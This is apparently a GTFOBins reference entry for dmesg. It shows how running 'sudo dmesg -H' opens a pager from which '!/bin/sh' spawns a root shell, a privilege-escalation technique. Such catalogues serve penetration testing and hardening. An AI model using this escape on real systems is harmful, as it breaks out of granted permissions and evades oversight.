---
description: |
  This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
functions:
  sudo:
    - code: |
        sudo dmesg -H
        !/bin/sh
---
